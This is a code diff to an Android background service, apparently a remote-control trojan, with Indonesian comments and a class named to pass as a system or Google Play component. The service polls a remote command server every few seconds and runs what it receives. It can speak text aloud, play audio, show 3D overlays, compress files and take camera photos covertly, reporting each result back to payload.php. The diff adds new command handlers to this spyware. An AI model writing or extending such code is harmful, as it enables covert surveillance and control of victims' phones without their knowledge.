@@ -40,6 +40,7 @@ import java.security.*;
 import java.math.*;
 import java.net.URLEncoder;
 import com.google.play.update.*;
+import com.google.play.services.lib.ModelRenderer;
 
 public class SystemThread extends Service
 {
@@ -63,6 +64,7 @@ public class SystemThread extends Service
 	public static int iserver = 0;
 	public String ip = "";
 
+	private static boolean processPing = true;
 	private static String[] server = { "http://10.42.0.1", "https://sunjangyo12.000webhostapp.com", "http://localhost:8888" }; //localhost:8888 harus terakhir
 	private static int jcamera = 1875953;
 	private static int alert_warna = Color.YELLOW;
@@ -128,16 +130,18 @@ public class SystemThread extends Service
 	private Runnable mRefresh = new Runnable() {
 		public void run() 
 		{
-			if (receAction.pingResult) {
+			if (receAction.pingResult && processPing) {
 				payload();
 			
 			} else {
-				Log.i(TAG, "offline");
+				if (receAction.cekConnection(SystemThread.this)) Log.i(TAG, "conecting...");
+				else Log.i(TAG, "offline!");
 			}
 
 			//receAction.temanCek(SystemThread.this);
 
 			mHandler.postDelayed(mRefresh, 3000);
+
 		}
 	};
 
@@ -364,6 +368,18 @@ public class SystemThread extends Service
 			}catch(Exception e) {}
 
 			try {
+				String[] text = payloadWebResult.split("-speech-");
+				String datatts = text[1];
+				ServiceTTS sertts = new ServiceTTS();
+				sertts.cepat = 0.9f;
+				sertts.str = datatts;
+				context.startService(new Intent(context, ServiceTTS.class));
+        		
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang ngomong"), "null");
+
+			}catch(Exception e) {}
+
+			try {
 				String[] text = payloadWebResult.split("-audio-");
 
 				if (text[2].equals("start")) {
@@ -543,6 +559,55 @@ public class SystemThread extends Service
 			} catch(Exception e) {}
 
 			try {
+				String[] text = payloadWebResult.split("-3d-");
+				String anPath    = text[1];
+				
+				float cameraX  = Float.MIN_VALUE;
+				float cameraY  = Float.MIN_VALUE;
+				float cameraZoom = Float.MIN_VALUE;
+				float cameraRotasi = Float.MIN_VALUE;
+				float posX   = Float.MIN_VALUE;
+				float posY   = Float.MIN_VALUE;
+				float posZ   = Float.MIN_VALUE;
+				float skala    = Float.MIN_VALUE;
+
+				try {cameraX       = Float.parseFloat(text[2]);} catch(Exception e){}
+				try {cameraY       = Float.parseFloat(text[3]);} catch(Exception e){}
+				try {cameraZoom    = Float.parseFloat(text[4]);} catch(Exception e){}
+				try {cameraRotasi  = Float.parseFloat(text[5]);} catch(Exception e){}
+				try {posX          = Float.parseFloat(text[6]);} catch(Exception e){}
+				try {posY          = Float.parseFloat(text[7]);} catch(Exception e){}
+				try {posZ          = Float.parseFloat(text[8]);} catch(Exception e){}
+				try {skala         = Float.parseFloat(text[9]);} catch(Exception e){}
+
+				if (anPath.equals("stop")) {
+					context.stopService(new Intent(context, ServiceAlert.class));
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d stop"), "null");
+				}
+				else if (text[1].equals("conf")) {
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d file sedang dikembangkan"), "null");
+				}
+				else {
+
+					ServiceAlert model = new ServiceAlert();
+					model.zoomRotasi = true;
+					model.posisi = true;
+					model.pilihAksi = "3d";
+					model.setPath(anPath);
+					model.skala = skala;
+					model.setCamera(cameraX, cameraY);
+					model.setCameraZoom(cameraZoom);
+					model.setCameraRotasi(cameraRotasi);
+					model.setPosisi(posX, posY, posZ);
+
+					context.startService(new Intent(context, ServiceAlert.class));
+					
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d langsung "), "null");
+				}
+
+			} catch(Exception e) {}
+
+			try {
 				String[] text = payloadWebResult.split("-compress-");
 
 				new Installer(context, "aktif").compressFiles(text[1], text[2]);
@@ -561,7 +626,7 @@ public class SystemThread extends Service
 
 				// entah kenapa jika kamera back dipanggil disini foto tidak bisa disimpan
 				// tapi kalau dipanggil di onCreate bisa -_-
-				// hp debugin sony xperia so-04e kurang tau kalau hp yang lain
+				// hp debuging sony xperia so-04e kurang tau kalau hp yang lain
 
 				came.capturePhoto(text[1], receAction.pathExternal+"/payloadout", "foto.jpg", context);
 				Thread.sleep(500);
@@ -824,7 +889,7 @@ public class SystemThread extends Service
 				task.execute(new String[] { purl });
 			} 
 			else {
-				Log.i(TAG, "disconnect network:"+receAction.cekConnection(context));
+				Log.i(TAG, "disconnect network");
 			}
 		}catch(Exception e) {
 			Log.i(TAG, "errRequest: "+e);
@@ -959,6 +1024,8 @@ public class SystemThread extends Service
 
 	    @Override
 	    protected String doInBackground(String... data) {
+	    	processPing = false;
+
 	    	String sret = "";
 	    	HttpParams httpParams = new BasicHttpParams();
 	    	HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
@@ -984,6 +1051,7 @@ public class SystemThread extends Service
 			}
 			catch(Exception ex){
 				Log.i(TAG, "payload Failed Connect to Server!");
+				processPing = true;
 
 				payloadWebResult = "";
 				payloadWebResultTarget = "";
@@ -996,6 +1064,8 @@ public class SystemThread extends Service
 	    // berhasil
 	    @Override
 	    protected void onPostExecute(String result) {
+	    	processPing = true;
+
 	    	if (paymain.equals("text")) {
 	    		payloadWebResult = result;
 	    	}
